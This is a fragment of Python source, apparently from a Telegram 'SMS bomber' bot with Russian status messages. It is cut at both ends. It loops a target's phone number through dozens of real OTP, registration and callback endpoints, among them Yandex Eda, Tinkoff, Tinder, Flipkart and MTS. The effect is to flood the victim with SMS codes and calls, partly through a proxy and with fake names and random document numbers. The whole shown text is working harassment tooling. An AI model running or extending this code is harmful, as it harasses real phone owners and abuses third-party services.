            print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print('[@'+str(bot_username)+'] [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Inv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sber отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
        except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Максим",
                "surname": "Летовал",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print('[@'+str(bot_username)+'] [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print('[@'+str(bot_username)+'] [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print('[@'+str(bot_username)+'] [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print('[@'+str(bot_username)+'] [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print('[@'+str(bot_username)+'] [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print('[@'+str(bot_username)+'] [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print('[@'+str(bot_username)+'] [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print('[@'+str(bot_username)+'] [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print('[@'+str(bot_username)+'] [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print('[@'+str(bot_username)+'] [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print('[@'+str(bot_username)+'] [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print('[@'+str(bot_username)+'] [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print('[@'+str(bot_username)+'] [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print('[@'+str(bot_username)+'] [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print('[@'+str(bot_username)+'] [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print('[@'+str(bot_username)+'] [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print('[@'+str(bot_username)+'] [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print('[@'+str(bot_username)+'] [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print('[@'+str(bot_username)+'] [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print('[@'+str(bot_username)+'] [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print('[@'+str(bot_username)+'] [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print('[@'+str(bot_username)+'] [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print('[@'+str(bot_username)+'] [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print('[@'+str(bot_username)+'] [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print('[@'+str(bot_username)+'] [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print('[@'+str(bot_username)+'] [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print('[@'+str(bot_username)+'] [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print('[@'+str(bot_username)+'] [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print('[@'+str(bot_username)+'] [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
